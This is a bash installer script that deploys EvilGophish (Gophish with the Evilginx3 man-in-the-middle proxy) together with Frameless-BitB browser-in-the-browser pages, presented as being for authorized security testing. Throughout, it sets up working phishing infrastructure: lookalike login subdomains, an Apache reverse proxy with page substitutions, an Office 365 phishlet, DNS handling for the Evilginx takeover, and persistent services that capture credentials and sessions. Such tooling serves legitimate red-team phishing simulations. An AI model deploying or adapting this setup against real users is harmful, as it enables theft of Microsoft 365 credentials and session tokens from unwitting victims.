#!/bin/bash
#
# EvilGophish + Frameless-BitB Master Setup Script
# Version: 1.0.0
#
# This script orchestrates the complete installation of EvilGophish
# with Frameless-BitB integration for authorized security testing.
#
# Usage: sudo ./master-setup.sh
#

set -e

# =============================================================================
# Configuration Variables
# =============================================================================

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Installation paths
INSTALL_DIR="/opt/evilgophish"
BITB_DIR="/opt/frameless-bitb"
LOG_DIR="/var/log"
BACKUP_DIR="/opt/backups/evilgophish"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Default configuration
DEFAULT_DOMAIN="secure-login.com"
DEFAULT_SUBDOMAINS="accounts login auth"
DEFAULT_RID="session_id"
ENABLE_FEED=true
ENABLE_ROOT_DOMAIN=false

# =============================================================================
# Utility Functions
# =============================================================================

log_info() {
    echo -e "${GREEN}[INFO]${NC} $(date '+%Y-%m-%d %H:%M:%S') - $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $(date '+%Y-%m-%d %H:%M:%S') - $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $(date '+%Y-%m-%d %H:%M:%S') - $1"
}

log_step() {
    echo -e "\n${BLUE}[STEP]${NC} $1"
    echo "=============================================="
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root"
        exit 1
    fi
}

check_os() {
    if [[ ! -f /etc/os-release ]]; then
        log_error "Cannot determine OS version"
        exit 1
    fi

    source /etc/os-release
    if [[ "$ID" != "ubuntu" ]]; then
        log_error "This script requires Ubuntu. Detected: $ID"
        exit 1
    fi

    if [[ "$VERSION_ID" != "20.04" && "$VERSION_ID" != "22.04" ]]; then
        log_warn "Untested Ubuntu version: $VERSION_ID. Recommended: 20.04 or 22.04"
    fi

    log_info "Operating System: $PRETTY_NAME"
}

prompt_config() {
    echo ""
    echo "=== Configuration Setup ==="
    echo ""

    read -p "Enter primary domain [$DEFAULT_DOMAIN]: " DOMAIN
    DOMAIN=${DOMAIN:-$DEFAULT_DOMAIN}

    read -p "Enter subdomains (space-separated) [$DEFAULT_SUBDOMAINS]: " SUBDOMAINS
    SUBDOMAINS=${SUBDOMAINS:-$DEFAULT_SUBDOMAINS}

    read -p "Enter custom tracking parameter [$DEFAULT_RID]: " RID
    RID=${RID:-$DEFAULT_RID}

    read -p "Enable live feed? (true/false) [$ENABLE_FEED]: " FEED_INPUT
    ENABLE_FEED=${FEED_INPUT:-$ENABLE_FEED}

    read -p "Enter server IP address: " SERVER_IP
    if [[ -z "$SERVER_IP" ]]; then
        SERVER_IP=$(curl -s ifconfig.me)
        log_info "Detected public IP: $SERVER_IP"
    fi

    echo ""
    echo "=== Configuration Summary ==="
    echo "Domain: $DOMAIN"
    echo "Subdomains: $SUBDOMAINS"
    echo "Tracking Parameter: $RID"
    echo "Live Feed: $ENABLE_FEED"
    echo "Server IP: $SERVER_IP"
    echo ""

    read -p "Proceed with installation? (y/n): " CONFIRM
    if [[ "$CONFIRM" != "y" && "$CONFIRM" != "Y" ]]; then
        log_info "Installation cancelled"
        exit 0
    fi
}

# =============================================================================
# Installation Functions
# =============================================================================

install_dependencies() {
    log_step "Installing System Dependencies"

    apt update
    apt upgrade -y

    # Build tools
    apt install -y build-essential

    # Network tools
    apt install -y net-tools dnsutils curl wget

    # Security tools
    apt install -y openssl certbot python3-certbot-apache

    # Web server
    apt install -y apache2 apache2-utils

    # Database
    apt install -y sqlite3 libsqlite3-dev

    # Process management
    apt install -y tmux supervisor

    # Utilities
    apt install -y git jq unzip

    log_info "System dependencies installed"
}

install_go() {
    log_step "Installing Go Language"

    GO_VERSION=$(curl -s https://go.dev/VERSION?m=text | head -1)
    log_info "Latest Go version: $GO_VERSION"

    if [[ -d /usr/local/go ]]; then
        log_warn "Existing Go installation found, backing up..."
        mv /usr/local/go /usr/local/go.bak.$(date +%s)
    fi

    wget -q "https://go.dev/dl/${GO_VERSION}.linux-amd64.tar.gz" -O /tmp/go.tar.gz
    tar -C /usr/local -xzf /tmp/go.tar.gz
    rm /tmp/go.tar.gz

    # Set up Go environment
    cat > /etc/profile.d/go.sh << 'EOF'
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$PATH:$GOROOT/bin:$GOPATH/bin
EOF

    source /etc/profile.d/go.sh
    ln -sf /usr/local/go/bin/go /usr/bin/go

    log_info "Go installed: $(go version)"
}

setup_apache_modules() {
    log_step "Configuring Apache Modules"

    a2enmod proxy
    a2enmod proxy_http
    a2enmod ssl
    a2enmod substitute
    a2enmod rewrite
    a2enmod headers
    a2enmod env
    a2enmod proxy_wstunnel

    log_info "Apache modules enabled"
}

configure_firewall() {
    log_step "Configuring Firewall"

    ufw --force reset
    ufw default deny incoming
    ufw default allow outgoing
    ufw allow 22/tcp comment 'SSH'
    ufw allow 53/tcp comment 'DNS TCP'
    ufw allow 53/udp comment 'DNS UDP'
    ufw allow 80/tcp comment 'HTTP'
    ufw allow 443/tcp comment 'HTTPS'
    ufw --force enable

    log_info "Firewall configured"
}

clone_repositories() {
    log_step "Cloning Repositories"

    # EvilGophish
    if [[ -d "$INSTALL_DIR" ]]; then
        log_warn "EvilGophish directory exists, backing up..."
        mv "$INSTALL_DIR" "${INSTALL_DIR}.bak.$(date +%s)"
    fi

    mkdir -p "$INSTALL_DIR"
    git clone https://github.com/theroseinc/evilgophish.git "$INSTALL_DIR"
    log_info "EvilGophish cloned to $INSTALL_DIR"

    # Frameless-BitB
    if [[ -d "$BITB_DIR" ]]; then
        log_warn "Frameless-BitB directory exists, backing up..."
        mv "$BITB_DIR" "${BITB_DIR}.bak.$(date +%s)"
    fi

    mkdir -p "$BITB_DIR"
    git clone https://github.com/theroseinc/frameless-bitb.git "$BITB_DIR"
    log_info "Frameless-BitB cloned to $BITB_DIR"
}

configure_dns() {
    log_step "Configuring DNS"

    # Backup existing configuration
    cp /etc/resolv.conf /etc/resolv.conf.bak
    cp /etc/hosts /etc/hosts.bak

    # Stop systemd-resolved
    systemctl stop systemd-resolved
    systemctl disable systemd-resolved

    # Configure resolv.conf
    echo "nameserver 8.8.8.8" > /etc/resolv.conf

    # Add host entries
    for subdomain in $SUBDOMAINS; do
        echo "127.0.0.1 ${subdomain}.${DOMAIN}" >> /etc/hosts
    done

    if [[ "$ENABLE_ROOT_DOMAIN" == "true" ]]; then
        echo "127.0.0.1 ${DOMAIN}" >> /etc/hosts
    fi

    log_info "DNS configured for evilginx3 takeover"
}

build_evilgophish() {
    log_step "Building EvilGophish Components"

    source /etc/profile.d/go.sh

    # Build Evilginx3
    log_info "Building Evilginx3..."
    cd "$INSTALL_DIR/evilginx3"
    go build -o evilginx3
    chmod +x evilginx3

    # Configure and build Gophish
    log_info "Configuring Gophish..."
    cd "$INSTALL_DIR/gophish"

    # Update config
    cat > config.json << EOF
{
    "admin_server": {
        "listen_url": "127.0.0.1:3333",
        "use_tls": true,
        "cert_path": "gophish_admin.crt",
        "key_path": "gophish_admin.key"
    },
    "phish_server": {
        "listen_url": "127.0.0.1:8080",
        "use_tls": true,
        "cert_path": "gophish_template.crt",
        "key_path": "gophish_template.key"
    },
    "feed_enabled": ${ENABLE_FEED},
    "db_name": "sqlite3",
    "db_path": "gophish.db",
    "migrations_prefix": "db/db_",
    "contact_address": "",
    "logging": {
        "filename": "gophish.log",
        "level": "info"
    }
}
EOF

    # Replace RID parameter
    if [[ "$RID" != "client_id" ]]; then
        find . -type f \( -name "*.go" -o -name "*.json" \) \
            -exec sed -i "s/client_id/${RID}/g" {} \;
    fi

    log_info "Building Gophish..."
    go build
    chmod +x gophish

    # Build Evilfeed
    if [[ "$ENABLE_FEED" == "true" ]]; then
        log_info "Building Evilfeed..."
        cd "$INSTALL_DIR/evilfeed"
        go build -o evilfeed
        chmod +x evilfeed
    fi

    log_info "EvilGophish components built successfully"
}

setup_frameless_bitb() {
    log_step "Setting Up Frameless-BitB"

    # Generate SSL certificates
    mkdir -p /etc/apache2/ssl

    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout /etc/apache2/ssl/bitb.key \
        -out /etc/apache2/ssl/bitb.crt \
        -subj "/C=US/ST=State/L=City/O=Organization/CN=${DOMAIN}"

    chmod 600 /etc/apache2/ssl/bitb.key
    chmod 644 /etc/apache2/ssl/bitb.crt

    # Copy custom substitutions
    mkdir -p /etc/apache2/custom-subs
    cp -r "$BITB_DIR/custom-subs/"* /etc/apache2/custom-subs/

    # Setup BitB pages
    mkdir -p /var/www/bitb/{home,primary,secondary}
    cp -r "$BITB_DIR/pages/home/"* /var/www/bitb/home/
    cp -r "$BITB_DIR/pages/primary/"* /var/www/bitb/primary/
    cp -r "$BITB_DIR/pages/secondary/"* /var/www/bitb/secondary/

    chown -R www-data:www-data /var/www/bitb
    chmod -R 755 /var/www/bitb

    # Update domain in all BitB files
    find "$BITB_DIR" -type f \( -name "*.conf" -o -name "*.html" -o -name "*.js" \) \
        -exec sed -i "s/fake\.com/${DOMAIN}/g" {} \;
    find /var/www/bitb -type f \
        -exec sed -i "s/fake\.com/${DOMAIN}/g" {} \;
    find /etc/apache2/custom-subs -type f \
        -exec sed -i "s/fake\.com/${DOMAIN}/g" {} \;

    # Copy and configure Apache VirtualHost
    cp "$BITB_DIR/apache-configs/win-chrome-bitb.conf" /etc/apache2/sites-available/bitb.conf
    sed -i "s/fake\.com/${DOMAIN}/g" /etc/apache2/sites-available/bitb.conf
    sed -i "s/YOUR_SERVER_IP/${SERVER_IP}/g" /etc/apache2/sites-available/bitb.conf

    # Enable site
    a2dissite 000-default
    a2ensite bitb

    # Copy O365 phishlet
    cp "$BITB_DIR/O365.yaml" "$INSTALL_DIR/evilginx3/phishlets/"

    log_info "Frameless-BitB configured"
}

create_service_users() {
    log_step "Creating Service Users"

    # Create users
    useradd -r -s /bin/false gophish 2>/dev/null || true
    useradd -r -s /bin/false evilfeed 2>/dev/null || true

    # Create log directories
    mkdir -p /var/log/{gophish,evilginx3,evilfeed}
    chown gophish:gophish /var/log/gophish
    chown root:root /var/log/evilginx3
    chown evilfeed:evilfeed /var/log/evilfeed

    # Set ownership
    chown -R gophish:gophish "$INSTALL_DIR/gophish"
    chown -R root:root "$INSTALL_DIR/evilginx3"
    chown -R evilfeed:evilfeed "$INSTALL_DIR/evilfeed"

    log_info "Service users and directories created"
}

install_systemd_services() {
    log_step "Installing Systemd Services"

    # Gophish service
    cat > /etc/systemd/system/gophish.service << EOF
[Unit]
Description=Gophish Phishing Framework
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=gophish
Group=gophish
WorkingDirectory=${INSTALL_DIR}/gophish
ExecStart=${INSTALL_DIR}/gophish/gophish
Restart=always
RestartSec=5
StandardOutput=append:/var/log/gophish/gophish.log
StandardError=append:/var/log/gophish/gophish-error.log
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ReadWritePaths=${INSTALL_DIR}/gophish

[Install]
WantedBy=multi-user.target
EOF

    # Evilginx3 service
    cat > /etc/systemd/system/evilginx3.service << EOF
[Unit]
Description=Evilginx3 MITM Proxy
After=network.target gophish.service
Requires=gophish.service

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=${INSTALL_DIR}/evilginx3
ExecStart=${INSTALL_DIR}/evilginx3/evilginx3 -feed -g ${INSTALL_DIR}/gophish/gophish.db
Restart=always
RestartSec=5
StandardOutput=append:/var/log/evilginx3/evilginx3.log
StandardError=append:/var/log/evilginx3/evilginx3-error.log

[Install]
WantedBy=multi-user.target
EOF

    # Evilfeed service
    if [[ "$ENABLE_FEED" == "true" ]]; then
        cat > /etc/systemd/system/evilfeed.service << EOF
[Unit]
Description=Evilfeed Live Event Dashboard
After=network.target gophish.service

[Service]
Type=simple
User=evilfeed
Group=evilfeed
WorkingDirectory=${INSTALL_DIR}/evilfeed
ExecStart=${INSTALL_DIR}/evilfeed/evilfeed
Restart=always
RestartSec=5
StandardOutput=append:/var/log/evilfeed/evilfeed.log
StandardError=append:/var/log/evilfeed/evilfeed-error.log
NoNewPrivileges=true
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF
    fi

    # Reload and enable
    systemctl daemon-reload
    systemctl enable gophish evilginx3

    if [[ "$ENABLE_FEED" == "true" ]]; then
        systemctl enable evilfeed
    fi

    log_info "Systemd services installed"
}

setup_log_rotation() {
    log_step "Configuring Log Rotation"

    cat > /etc/logrotate.d/evilgophish << 'EOF'
/var/log/gophish/*.log
/var/log/evilginx3/*.log
/var/log/evilfeed/*.log
{
    daily
    rotate 14
    compress
    delaycompress
    missingok
    notifempty
    create 0640 root adm
    sharedscripts
    postrotate
        systemctl reload gophish evilginx3 evilfeed > /dev/null 2>&1 || true
    endscript
}
EOF

    log_info "Log rotation configured"
}

create_backup_directory() {
    log_step "Setting Up Backup Directory"

    mkdir -p "$BACKUP_DIR"
    chmod 700 "$BACKUP_DIR"

    log_info "Backup directory created at $BACKUP_DIR"
}

initialize_database() {
    log_step "Initializing Gophish Database"

    cd "$INSTALL_DIR/gophish"

    # Start gophish briefly to initialize database
    sudo -u gophish ./gophish &
    GOPHISH_PID=$!
    sleep 10

    # Capture initial password
    INITIAL_PASSWORD=$(grep -o 'password [^ ]*' /var/log/gophish/gophish.log | tail -1 | awk '{print $2}')

    # Stop gophish
    kill $GOPHISH_PID 2>/dev/null || true
    wait $GOPHISH_PID 2>/dev/null || true

    if [[ -n "$INITIAL_PASSWORD" ]]; then
        log_info "Initial admin password: $INITIAL_PASSWORD"
        echo "$INITIAL_PASSWORD" > /root/gophish_initial_password.txt
        chmod 600 /root/gophish_initial_password.txt
    fi

    log_info "Database initialized"
}

start_services() {
    log_step "Starting Services"

    systemctl restart apache2
    systemctl start gophish
    sleep 3
    systemctl start evilginx3

    if [[ "$ENABLE_FEED" == "true" ]]; then
        systemctl start evilfeed
    fi

    log_info "Services started"
}

verify_installation() {
    log_step "Verifying Installation"

    echo ""

    # Check binaries
    echo "Checking binaries..."
    [[ -x "$INSTALL_DIR/evilginx3/evilginx3" ]] && echo "  [OK] Evilginx3 binary" || echo "  [FAIL] Evilginx3 binary"
    [[ -x "$INSTALL_DIR/gophish/gophish" ]] && echo "  [OK] Gophish binary" || echo "  [FAIL] Gophish binary"
    [[ -x "$INSTALL_DIR/evilfeed/evilfeed" ]] && echo "  [OK] Evilfeed binary" || echo "  [FAIL] Evilfeed binary"

    # Check services
    echo ""
    echo "Checking services..."
    systemctl is-active --quiet apache2 && echo "  [OK] Apache2 running" || echo "  [FAIL] Apache2 not running"
    systemctl is-active --quiet gophish && echo "  [OK] Gophish running" || echo "  [FAIL] Gophish not running"
    systemctl is-active --quiet evilginx3 && echo "  [OK] Evilginx3 running" || echo "  [FAIL] Evilginx3 not running"

    if [[ "$ENABLE_FEED" == "true" ]]; then
        systemctl is-active --quiet evilfeed && echo "  [OK] Evilfeed running" || echo "  [FAIL] Evilfeed not running"
    fi

    # Check ports
    echo ""
    echo "Checking ports..."
    netstat -tuln | grep -q ":53 " && echo "  [OK] Port 53 (DNS)" || echo "  [FAIL] Port 53 (DNS)"
    netstat -tuln | grep -q ":80 " && echo "  [OK] Port 80 (HTTP)" || echo "  [FAIL] Port 80 (HTTP)"
    netstat -tuln | grep -q ":443 " && echo "  [OK] Port 443 (HTTPS)" || echo "  [FAIL] Port 443 (HTTPS)"
    netstat -tuln | grep -q ":3333 " && echo "  [OK] Port 3333 (Gophish Admin)" || echo "  [FAIL] Port 3333 (Gophish Admin)"

    echo ""
}

print_summary() {
    echo ""
    echo "=============================================="
    echo "       Installation Complete!"
    echo "=============================================="
    echo ""
    echo "Configuration:"
    echo "  Domain: $DOMAIN"
    echo "  Subdomains: $SUBDOMAINS"
    echo "  Server IP: $SERVER_IP"
    echo ""
    echo "Access Points:"
    echo "  Gophish Admin: https://127.0.0.1:3333"
    echo "    (Use SSH tunnel: ssh -L 3333:127.0.0.1:3333 user@server)"

    if [[ "$ENABLE_FEED" == "true" ]]; then
        echo "  Live Feed: http://127.0.0.1:1337"
        echo "    (Use SSH tunnel: ssh -L 1337:127.0.0.1:1337 user@server)"
    fi

    echo ""
    echo "Initial Credentials:"
    echo "  Username: admin"
    if [[ -f /root/gophish_initial_password.txt ]]; then
        echo "  Password: $(cat /root/gophish_initial_password.txt)"
        echo "  (Also saved to /root/gophish_initial_password.txt)"
    fi

    echo ""
    echo "Important Commands:"
    echo "  Start services: systemctl start gophish evilginx3 evilfeed"
    echo "  Stop services: systemctl stop gophish evilginx3 evilfeed"
    echo "  View logs: tail -f /var/log/{gophish,evilginx3}/*.log"
    echo ""
    echo "Documentation: $INSTALL_DIR/docs/production-deployment/"
    echo ""
    echo "=============================================="
}

# =============================================================================
# Main Execution
# =============================================================================

main() {
    echo ""
    echo "=============================================="
    echo "  EvilGophish + Frameless-BitB Setup"
    echo "  Production Deployment Script v1.0.0"
    echo "=============================================="
    echo ""

    check_root
    check_os
    prompt_config

    install_dependencies
    install_go
    setup_apache_modules
    configure_firewall
    clone_repositories
    configure_dns
    build_evilgophish
    setup_frameless_bitb
    create_service_users
    install_systemd_services
    setup_log_rotation
    create_backup_directory
    initialize_database
    start_services
    verify_installation
    print_summary
}

# Run main function
main "$@"
